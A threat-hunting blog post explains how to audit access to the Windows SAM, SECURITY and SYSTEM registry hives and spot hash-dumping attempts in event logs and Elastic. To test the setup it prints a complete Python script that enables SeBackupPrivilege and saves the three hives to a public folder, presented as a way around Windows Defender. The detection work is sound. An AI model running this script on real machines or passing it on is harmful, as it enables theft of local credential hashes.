---
title:  "Locating SAM registry hashdumps using Elastic!"
header:
  teaser: "/assets/images/samhashdetect.png"
categories:
  - Threat Hunting
tags:
  - elk
  - hashdump
  - thumbdrive
  - SAM
  - SECURITY
  - SYSTEM
  - registry hive
  - elastic
  - kibana
  - logstash
  - filebeats
  - threat hunting
  - blue team
  - winlogbeat
  - sysmon
  - elevationstation
---

You guys know what time it is? IT'S GO TIME! Time to dive in and learn how to detect a red teamer trying to grab your local SAM hashes from the registry.  

**Detecting SAM Hashdump attempts - The Setup**
-

First, open up `gpedit.msc`

Next, navigate to this section and enable the highlighted subcategories.  You really only need to enable like two of these, but this is to prepare you for the next writeup where we will be detecting thumbdrives as they are plugged in to any USB port!

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/5e6048d6-5e1b-4c28-95ea-01cf8b405b60)

Okay now for the tedious part...we need to enable auditing for all three keys: **SAM**, **SECURITY**, AND **SYSTEM**

We will start with setting up auditing for the SAM registry hive file:

Open `regedit.exe`

right click on `SAM`

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/e8fdd743-fae6-4e2d-b97e-a9b9efb71a40)

Choose `"Permissions"`

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/8c84f925-60d1-4761-98a6-22c5eb76b105)

Choose `"Advanced"`

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/17fdbc6d-6275-42d7-986d-d4b8d5705789)

Okay, for this next part you want to create a new Security Principal.  We want that new principal to be "Everyone" since we want to audit all accounts that try to access this registry key.  Once that principal is created, it will look like this:

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/0b2d7016-6f3f-4cd4-9a19-064830c8b69a)

Also make sure you choose `"This key only"`

Almost there.  Next, double click on the newly created `"Everyone"` Principal.  Then, choose `"Show advanced permissions"` in the upper right hand corner.

That will need to look like this:

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/f2d09f32-1daf-488a-ad28-9a74a72e0c98)

PHEW!  glad that's over with....or is it?!?!  Well sort of.  We still have to do what we just did with the SAM registry file to the SECURITY and SYSTEM. But I don't feel like creating images and typing all this out again, so here's what we're going to do.  I'm going to list what you need to do below for the SECURITY AND SYSTEM keys for your auditing config needs.  Let's go!

**SECURITY**

- `Everyone`
  - `This key only`

**SECURITY/Cache**

- `Everyone`
  - `This key and subkeys`
 
**SECURITY/Policy/Secrets**

- `Everyone`
  - `This key and subkeys`
 
**SYSTEM**

- `Everyone`
  - `This key only`

Okay, you can choose to dump the SAM, SECURITY, and SYSTEM files manually via regedit.exe (You'll likely get snagged by Windows Defender AV).  Or....you could do the tactical way.  Let's go the tactical route.  We're going to use python to write our registry dump script:

Download the raw python script here: [dumpy.py](https://github.com/g3tsyst3m/undertheradar/blob/main/dumpy.py)

Or, simply copy pasta from here:

```python
import win32security
import win32api
import win32con
import win32process
import os
import sys
import winreg
import ntsecuritycon as ntc
import pywintypes


def ElevatedorNot():
    thehandle=win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)
    elevated = win32security.GetTokenInformation(thehandle, win32security.TokenElevation)
    #print("is token elevated?", elevated)
    if elevated == 1:
        print("[+] elevated status: TokenIsElevated!!!")
        return True
    else:
        print("[!] token is not elevated...")
        return False

def SetBackupPrivilege():
    try:
        thehandle=win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
        id = win32security.LookupPrivilegeValue(None, "SeBackupPrivilege")
        newPrivileges = [(id, win32security.SE_PRIVILEGE_ENABLED)]
        win32security.AdjustTokenPrivileges(thehandle, False, newPrivileges)
        print("[+] successfully gained SeBackupPrivilege!!!!")
        return True
    except:
        print("[!] couldn't get seDebugPrivilege...")
        return False

def dumpreg():
    #Sam File
    samhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SAM", 0, win32con.KEY_ALL_ACCESS)
    win32api.RegSaveKey(samhandle, "c:\\users\\public\\sam.save", None)
    win32api.RegCloseKey(samhandle)
    
    #System File
    systemhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SYSTEM", 0, win32con.KEY_ALL_ACCESS)
    win32api.RegSaveKey(systemhandle, "c:\\users\\public\\system.save", None)
    win32api.RegCloseKey(systemhandle)
    
    
    #Security File (we dont have permissions to get this by default...but it's really only useful for domain creds and I just want local admin)
    try:
        securityhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SECURITY", 0, win32con.KEY_ALL_ACCESS)
        win32api.RegSaveKey(securityhandle, "c:\\users\\public\\security.save", None)
        win32api.RegCloseKey(securityhandle)
    except:
        print("you don't have permission to grab the SECURITY file...")
    return True
if not ElevatedorNot():
    print("[!] not elevated...\n")
    exit()
if not SetBackupPrivilege():
    print("[!] could not get seBackupPrivilege...\n")
    exit()
if dumpreg():
    print("[+] Successfully dumped SAM, SYSTEM, and SECURITY files!!!\n")
    exit()
else:
    print("[!] couldn't dump registry...\n")
f.close()
```

Save it, and run it:  

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/8ca9d23e-d9ed-4fbf-815c-c849b7c05d3b)

If everything was setup correctly, you should see the following in windows event logs:

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/f04ab046-20c6-433d-9cea-8a25d0c2d73c)

And last but certainly not least, in Elastic!

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/56d79889-9d65-44cd-b92b-a64501f2945d)

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/8381222b-e061-42c0-b98a-8292b25baa96)

Hope this helps my fellow red team and blue teamers out there. It's knowledge you need regardless of which role you're in. 😸 Blue team for obvious reasons.  Red team, to see the possibilities built-in to Windows for detecting your clever tricks.  Until next time, adios!
